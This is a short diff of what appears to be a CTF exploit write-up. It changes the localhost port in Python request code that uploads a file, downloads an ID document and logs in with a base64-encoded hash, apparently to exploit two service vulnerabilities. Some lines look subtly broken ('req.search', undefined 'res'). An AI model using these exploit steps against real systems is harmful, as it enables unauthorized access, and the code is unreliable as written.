@@ -51,9 +51,9 @@ Two different exploits for VULN#1 and VULN#2 need to be run after each other to 
         }
         
         files = {'id_image': (filename, 'filestring', 'application/octet-stream')}
-        req = requests.post('http://localhost:6597/make_appointment', data=data, files=files, cookies=cookies)
+        req = requests.post('http://localhost:8597/make_appointment', data=data, files=files, cookies=cookies)
         result = req.search('Successfully made appointment &lt;(.*)&gt', res.text)
-        url = 'http://localhost:6597/get_id' + result.group(1)
+        url = 'http://localhost:8597/get_id' + result.group(1)
 
         download = requests.get(url, allow_redirects=True, cookies=cookies)
         return download.content
@@ -74,6 +74,6 @@ Two different exploits for VULN#1 and VULN#2 need to be run after each other to 
                 'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
                 'login': 'signin'
         }
-        req = requests.post('http://localhost:6597/login', data=obj)
+        req = requests.post('http://localhost:8597/login', data=obj)
         return req.text
 ```
